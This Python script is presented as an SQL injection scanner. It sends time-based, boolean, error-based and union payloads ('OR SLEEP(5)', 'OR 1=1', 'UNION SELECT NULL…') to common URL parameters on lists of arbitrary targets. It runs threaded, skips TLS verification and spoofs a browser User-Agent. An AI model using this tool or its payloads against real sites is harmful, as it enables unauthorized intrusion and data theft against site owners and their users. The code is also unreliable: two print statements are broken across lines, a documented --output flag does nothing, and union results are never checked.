#!/usr/bin/env python3
"""
SQL Injection Scanner - Automated detection of SQL injection vulnerabilities
Supports: Time-based blind, Boolean-based blind, Error-based, Union-based

Techniques: 
  - Time-based: pg_sleep(), BENCHMARK(), WAITFOR DELAY
  - Boolean-based: Conditional responses diff
  - Error-based: Extract data via DB errors
  - Union-based: Direct data extraction
"""
import requests, sys, concurrent.futures, os, time, re
requests.packages.urllib3.disable_warnings()

BANNER = '''
╔═══════════════════════════════════════════╗
║        SQL Injection Scanner              ║
║  Time-based | Boolean | Error | Union     ║
╚═══════════════════════════════════════════╝
'''

PAYLOADS = {
    "time_mysql": "' OR SLEEP(5)-- -",
    "time_pgsql": "') OR pg_sleep(5)-- -",
    "time_mssql": "'; WAITFOR DELAY '0:0:5'--",
    "bool_true": "' OR 1=1-- -",
    "bool_false": "' AND 1=2-- -",
    "error": "' OR 1=CAST((SELECT @@version) AS INT)-- -",
    "union": "' UNION SELECT NULL,NULL,NULL-- -",
}

def scan_url(target):
    base = f"https://{target}" if not target.startswith("http") else target
    base = base.rstrip("/")
    results = {"target": target, "vulnerable": False, "details": [], "findings": []}
    
    # Test common injection points
    params_to_test = ["id", "page", "cat", "product", "user", "q", "search", "name", "email"]
    
    for param in params_to_test:
        for vuln_type, payload in PAYLOADS.items():
            url = f"{base}?{param}={requests.utils.quote(payload)}"
            try:
                start = time.time()
                r = requests.get(url, timeout=15, verify=False,
                    headers={"User-Agent": "Mozilla/5.0"})
                elapsed = time.time() - start
                
                # Time-based detection
                if "time" in vuln_type and elapsed > 4.5:
                    results["vulnerable"] = True
                    results["findings"].append(f"[TIME-BASED] {param}={payload} ({elapsed:.1f}s)")
                
                # Boolean-based detection
                if "bool" in vuln_type:
                    url_true = f"{base}?{param}=1' OR 1=1-- -"
                    url_false = f"{base}?{param}=1' AND 1=2-- -"
                    r_true = requests.get(url_true, timeout=10, verify=False)
                    r_false = requests.get(url_false, timeout=10, verify=False)
                    if len(r_true.text) != len(r_false.text):
                        results["vulnerable"] = True
                        results["findings"].append(f"[BOOLEAN] {param} - response diff detected")
                
                # Error-based detection
                if "error" in vuln_type and ("SQL" in r.text or "syntax" in r.text.lower() or "mysql" in r.text.lower()):
                    results["vulnerable"] = True
                    results["findings"].append(f"[ERROR] {param} - SQL error in response")
            
            except: pass
    
    return results

def main():
    print(BANNER)
    if len(sys.argv) < 2:
        print("Usage: python3 sqli_scanner.py <target|file> [--threads 10]")
        print("       python3 sqli_scanner.py https://example.com/page?id=1")
        print("       python3 sqli_scanner.py targets.txt --output results.txt")
        sys.exit(1)
    
    targets = []
    if os.path.isfile(sys.argv[1]):
        with open(sys.argv[1]) as f:
            targets = [l.strip() for l in f if l.strip()]
    else:
        targets = [sys.argv[1]]
    
    threads = 10
    if "--threads" in sys.argv:
        threads = int(sys.argv[sys.argv.index("--threads") + 1])
    
    print(f"[*] Scanning {len(targets)} targets ({threads} threads)")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        fut = {ex.submit(scan_url, t): t for t in targets}
        for f in concurrent.futures.as_completed(fut):
            r = f.result()
            if r["vulnerable"]:
                print(f"
[!!] {r['target']}")
                for finding in r["findings"]:
                    print(f"     {finding}")
    
    print("
[*] Scan complete")

if __name__ == "__main__":
    main()
